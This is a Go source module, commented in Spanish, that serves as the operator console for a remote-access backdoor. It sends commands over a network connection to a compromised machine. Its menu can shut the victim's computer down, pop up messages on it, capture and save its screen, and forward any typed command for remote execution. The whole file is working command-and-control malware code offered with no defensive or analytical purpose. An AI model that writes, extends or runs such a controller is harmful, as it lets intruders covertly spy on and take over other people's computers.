// modulo que prepara los comandos a enviar al backdoor
package remoto

import (
	color "comando/colores"
	"comando/conex/comandos/ss"
	"comando/input"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const INSTRUCCION = `
//comandos basicos:       //
//[0] limpiar consola     //       
//[1] apagar equipo       //
//[2] enviar mensaje      //
//[q] salir               //
//[ss] capturar pantalla  //
`
const (
	TIMEOUT = 10   // tiempo en segundos que espera el cliente para recibir un paquete
	BUFFER  = 1024 //tamaño del buffer de funcion envio
)

// funcion que abstrae el envio de paquetes al host
func envio(conexiones net.Conn, envio string) error {

	err_t := conexiones.SetDeadline(time.Now().Add(time.Second * TIMEOUT))
	if err_t != nil {
		return errors.New("tiempo agotado")
	}

	buffer := make([]byte, BUFFER)

	_, escritura_error := conexiones.Write([]byte(envio))
	if escritura_error != nil {
		return errors.New("[!] hubo un problema durante el envio del comando")

	} else {
		// retornar los datos
		num, lectura_error := conexiones.Read(buffer)
		if lectura_error != nil {
			return errors.New("[!] error al recibir la informacion")

		} else {
			fmt.Println(string(buffer[:num]))
		}

	}
	return nil
}

// abstraigo la funcion para borrar consola
func Borrar_consola() error {
	if runtime.GOOS == "windows" {
		comandos := exec.Command("powershell", "-command", "clear")
		comandos.Stdout = os.Stdout
		comando_error := comandos.Run()
		fmt.Println(color.Violeta + color.LOGO + color.Reset)
		if comando_error != nil {
			return errors.New("[!] error al ejecutar comando")
		}

	} else {
		fmt.Print("\033[2J")

	}
	return nil
}

// funcion cuyo proposito es la ejecucion de comandos
func Comando(conexiones net.Conn) error {
	// error que fuerza la recnexion para evitar problemas de desincronizacion con el host
	var reconectar = errors.New("reconexion")

	println(color.Violeta + INSTRUCCION + color.Reset)
	entrada := input.Input("[#] comando >> ")
	switch entrada {
	case "0": // borrar consola
		err := Borrar_consola()
		if err != nil {
			fmt.Println(err)
		}

	case "1": // apagar equipo
		err := envio(conexiones, "shutdown /s")
		if err != nil {
			return err
		}
	case "2": // automatizacion de msg para ciertas ediciones de windows

		mensaje := input.Input("mensaje >> ")

		envio(conexiones, fmt.Sprintf("msn-%s", mensaje))

	case "q":
		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
		envio(conexiones, "q")
		conexiones.Close()
		os.Exit(0)
	case "ss":
		ch_img := make(chan []byte)
		ch_err := make(chan error)
		contex, cancel := context.WithTimeout(context.Background(), time.Second*5)
		defer cancel()

		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
		go func() {
			byte_img, img_error := ss.Obtener_img(conexiones)
			ch_img <- byte_img
			ch_err <- img_error
		}()

		select {

		case <-contex.Done():
			fmt.Println("[!] el host tardo mucho en responder a la solicitud de ss")

		case img_error := <-ch_err:
			return errors.New(fmt.Sprintf("[!] error al obtener la imagen:\n %s", img_error))

		case img := <-ch_img:
			if img != nil {
				nombre := input.Input("[*] nombre del png (sin extension)>> ")
				ss.Escribir_img(img, nombre)

				if runtime.GOOS == "windows" {
					exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
				}

			} else {
				return errors.New("no se pudo obtener la imagen por falta de permisos del host")
			}

		}
	default:
		err := envio(conexiones, entrada)
		if err != nil {
			return err
		}

	}
	input.Input("[+] presione ENTER para continuar ...")
	return reconectar

}
